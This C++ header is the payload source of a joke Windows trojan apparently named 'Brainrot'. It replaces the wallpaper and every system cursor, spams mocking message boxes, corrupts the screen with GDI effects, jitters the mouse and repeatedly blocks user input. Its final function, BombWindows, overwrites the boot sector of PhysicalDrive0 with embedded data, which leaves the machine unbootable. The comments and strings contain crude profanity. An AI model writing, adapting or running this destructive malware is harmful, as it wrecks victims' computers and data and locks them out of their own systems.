#pragma once

#include "Brainrot2025.h"

void Eggsit()
{
	ExitProcess(1337);
}

DTHREAD(ChangeWallpaper)
{
	wchar_t wpPath[MAX_PATH];
	GetFullPathNameW(L"NOBITCHES.bmp", MAX_PATH, wpPath, 0);
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wpPath, SPIF_SENDCHANGE);

	PlaySoundFile(L"VINEBOOM.wav", 0);

	return 0;
}

DTHREAD(ChangeCursor)
{
	for (int c = 32500; c < 32700; c++)
	{
		HCURSOR pussy = (HCURSOR)LoadImageW(0, L"PUSSY.cur", IMAGE_CURSOR, 0, 0, LR_LOADFROMFILE);
		SetSystemCursor(pussy, c);
	}

	return 0;
}

DTHREAD(PlayMusic)
{
	//Music:
	//Anal Wanker - Fape
	//Saymooon - UFO PORNO

	PlaySoundFile(L"ZONG.wav", Eggsit);

	return 0;
}

#include "DownloadWindow.h"

DTHREAD(WindowSpam)
{
	LOOP
	{
		THREAD(DownloadWindow);
		Sleep(20000 + Random() % 500);
	}
}

LRESULT WINAPI MoveMsg(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HCBT_CREATEWND)
	{
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP))
		{
			HWND hwnd = (HWND)wParam;

			int x = Random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = Random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y; //Move message box randomly
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int nMessage = 3; //Make sure the 3rd MessageBox always displays the text "nFire 4ever"
int lolPrevious = -1;
DTHREAD(LolMsg)
{
	LPCWSTR texts[] =
	{
		L"YOUR COMPUTER HAS 34 VIRUSES!!1!!1!1!",
		L"nice computer mate",
		L"this is why you should never use getintopc",
		L"it was at this moment that he knew, he fucked up",
		L"call me: +69 420 666 1337",
		L"now, why don't you go outside and touch some grass?",
		L"i wouldn't click on one of those pop-ups btw",
		L"YOU ARE AN IDIOT HAHAHAHAHAHAHAHAHAHAHAHAHA",
		L"oof",
		L"HOW MANY TIMES DO I HAVE TO TELL YOU THAT PIRATING ANTIVIRUSES IS NOT A GOOD IDEA?",
		L"rest in rip",
		L"bro just realized :skull:",
		L"nFire 4ever",
		L"Still using this computer?", //Is that a MEMZ reference!?
		L"WAS THAT THE MALWAREBITE OF 87??",
		L"Hello everyone, so today we take a look at theeeee Brainrot, trojan",
	};

	int chosen;
	do
	{
		chosen = Random() % 16;
	}
	while (chosen == lolPrevious);
	previous = lolPrevious;

	HHOOK hook = SetWindowsHookExW(WH_CBT, MoveMsg, 0, GetCurrentThreadId());

	if (nMessage > -1)
		nMessage -= 1;

	MessageBoxW(0, !nMessage ? texts[12] : texts[chosen], chosen == 13 && nMessage ? L"lol" : L"heyo", (chosen == 13 && nMessage ? MB_ICONWARNING : MB_ICONHAND) | MB_SYSTEMMODAL); //Spawn "heyo" message box (if the message is the MEMZ one, the title reads "lol" instead)
	UnhookWindowsHookEx(hook);

	return 0;
}

DTHREAD(MessageSpam) //It's all about spamming in this trojan
{
	LOOP
	{
		THREAD(LolMsg);
		Sleep(10000 + Random() % 500);
	}
}

int thitLevel = 1; //thit means Too Hot In Here if it wasn't clear
bool thitAnd = false;
DTHREAD(TooHotInHere)
{
	LOOP
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int ww = w / 20;
		int hh = h / 50;

		for (int i = 0; i < 100; i++)
		{
			int x = Random() % w;

			BitBlt(hdc, x, 0, ww, h, hdc, x, -hh, SRCCOPY);
			if (thitAnd)
				BitBlt(hdc, x, 0, ww, h, hdc, x, -hh, SRCAND);

			Sleep(2000 / thitLevel);
		}

		if (Random() % 3)
		{
			InvalidateRect(0, 0, 1);
			UpdateWindow(0); //Clear Desktop
		}
	}
}

DTHREAD(Blurb)
{
	LOOP
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		for (int i = 0; i < w; i += 5)
		{
			for (int j = 0; j < h; j += 5)
			{
				int x = Random() % 11 - 5;
				int y = Random() % 11 - 5;

				BitBlt(hdc, i, j, 5, 5, hdc, i + x, j + y, SRCCOPY);
			}
		}

		Sleep(20000 + Random() % 500);
	}
}

DTHREAD(Iconpochalypse)
{
	HICON error = LoadIconW(0, IDI_ERROR);
	HICON warning = LoadIconW(0, IDI_WARNING);
	HICON information = LoadIconW(0, IDI_INFORMATION);
	HICON question = LoadIconW(0, IDI_QUESTION);
	HICON trull = (HICON)LoadImageW(0, L"TRULL.ico", IMAGE_ICON, 256, 256, LR_LOADFROMFILE);
	HICON shrok = (HICON)LoadImageW(0, L"SHROK.ico", IMAGE_ICON, 256, 256, LR_LOADFROMFILE);

	HICON icons[] = { error, warning, information, question, trull, shrok };

	LOOP
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		for (int i = 0; i < 100; i++)
		{
			DrawIcon(hdc, Random() % w, Random() % h, icons[Random() % 6]);
			Sleep(700);
		}
	}
}

DTHREAD(ColorMess)
{
	LOOP
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC dHdc = GetDC(0);
		HDC sHdc = CreateCompatibleDC(0);
		BITMAPINFO bmi = { 0 };
		LPBYTE bits = (LPBYTE)LocalAlloc(LMEM_ZEROINIT, w * h * 4);
		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmi.bmiHeader.biWidth = w;
		bmi.bmiHeader.biHeight = h;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biCompression = BI_RGB;
		HBITMAP hbmp = CreateDIBSection(sHdc, &bmi, DIB_RGB_COLORS, (LPVOID*)&bits /*<- Oh my god are you serious?? Why do I have to write that atrocity!!*/, 0, 0);
		SelectObject(sHdc, hbmp);

		int op = Random() % 14;

		int r = Random() % 256;
		int g = Random() % 256;
		int b = Random() % 256;

		int rh = Random() % 360;

		int tmp = 0;

		BitBlt(sHdc, 0, 0, w, h, dHdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++)
			for (int j = 0; j < h; j++)
			{
				LPBYTE pixel = PIXEL(bits, w, i, j);

				if (op < 3) //Invert with color
				{
					pixel[0] ^= b;
					pixel[1] ^= g;
					pixel[2] ^= r;
				}
				else if (op < 6) //Darken with color
				{
					pixel[0] &= b;
					pixel[1] &= g;
					pixel[2] &= r;
				}
				else if (op < 9) //Brighten with color
				{
					pixel[0] |= b;
					pixel[1] |= g;
					pixel[2] |= r;
				}
				else if (op == 9) //Invert colors
				{
					pixel[0] ^= 0xFF;
					pixel[1] ^= 0xFF;
					pixel[2] ^= 0xFF;
				}
				else if (op == 10) //Swap RGB clockwise
				{
					tmp = pixel[0];
					pixel[0] = pixel[1];
					pixel[1] = pixel[2];
					pixel[2] = tmp;
				}
				else if (op == 11) //Swap RGB counter-clockwise
				{
					tmp = pixel[2];
					pixel[2] = pixel[1];
					pixel[1] = pixel[0];
					pixel[0] = tmp;
				}
				else if (op == 12) //Black 'n' white
				{
					int avg = (pixel[0] + pixel[1] + pixel[2]) / 3;
					pixel[0] = avg;
					pixel[1] = avg;
					pixel[2] = avg;
				}
				else //Hue = constant
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					H = rh;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
			}

		BitBlt(dHdc, Random() % w - w / 2, Random() % h - h / 2, w, h, sHdc, 0, 0, SRCCOPY);

		DeleteObject(hbmp);
		DeleteDC(sHdc);

		Sleep(20000 + Random() % 500);
	}

	return 0;
}

DTHREAD(Rainbowel)
{
	LOOP
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC dHdc = GetDC(0);
		HDC sHdc = CreateCompatibleDC(0);
		BITMAPINFO bmi = { 0 };
		LPBYTE bits = (LPBYTE)LocalAlloc(LMEM_ZEROINIT, w * h * 4);
		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmi.bmiHeader.biWidth = w;
		bmi.bmiHeader.biHeight = h;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biCompression = BI_RGB;
		HBITMAP hbmp = CreateDIBSection(sHdc, &bmi, DIB_RGB_COLORS, (LPVOID*)&bits /*<- Oh my god are you serious?? Why do I have to write that atrocity!!*/, 0, 0);
		SelectObject(sHdc, hbmp);

		int op = Random() % 6;

		int r = Random() % 256;
		int g = Random() % 256;
		int b = Random() % 256;

		int tmp = 0;

		BitBlt(sHdc, 0, 0, w, h, dHdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++)
			for (int j = 0; j < h; j++)
			{
				LPBYTE pixel = PIXEL(bits, w, i, j);

				if (op == 0) //Striped rainbow
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					H = (H + i + j) % 360;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
				else if (op == 1) //Rainbow circle
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					H = (H + (int)sqrt((i - w / 2) * (i - w / 2) + (j - h / 2) * (j - h / 2))) % 360;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
				else if (op == 2) //Wavy rainbow
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					H = (H + j + (int)(sin(i / 20) * 20)) % 360;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
				else if (op == 3) //Hue = lightness
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					H = v * 360 / 255;
					s = 255;
					v = 255;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
				else if (op == 4) //Red, green OR blue
				{
					int M = max(pixel[0], max(pixel[1], pixel[2]));
					pixel[0] = pixel[0] == M ? M : 0;
					pixel[1] = pixel[1] == M ? M : 0;
					pixel[2] = pixel[2] == M ? M : 0;
				}
				else //Value multiplied by saturation
				{
					int H, s, v;
					RGBtoHSV(pixel[2], pixel[1], pixel[0], H, s, v);
					v = v * s / 255;
					HSVtoRGB(H, s, v, pixel[2], pixel[1], pixel[0]);
				}
			}

		BitBlt(dHdc, 0, 0, w, h, sHdc, 0, 0, SRCCOPY);

		DeleteObject(hbmp);
		DeleteDC(sHdc);

		Sleep(5000 + Random() % 15000);
	}

	return 0;
}

int msLevel = 1;
DTHREAD(MouseSpasms)
{
	POINT p;
	int n[] = { -1, 1 };

	LOOP
	{
		GetCursorPos(&p);
		p.x += n[Random() % 2] * msLevel;
		p.y += n[Random() % 2] * msLevel;
		SetCursorPos(p.x, p.y);

		Sleep(100 / msLevel);
	}
}

DTHREAD(Paralysis)
{
	LOOP
	{
		BlockInput(true);
		Sleep(500);
	}
}

BYTE bl[] =
{
#include "OS/OS.dat"
};

void BombWindows()
{
	HANDLE pd0 = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	DWORD bw; //Bytes written
	WriteFile(pd0, bl, sizeof(bl), &bw, 0); //Overwrite bootloader

	CloseHandle(pd0);
}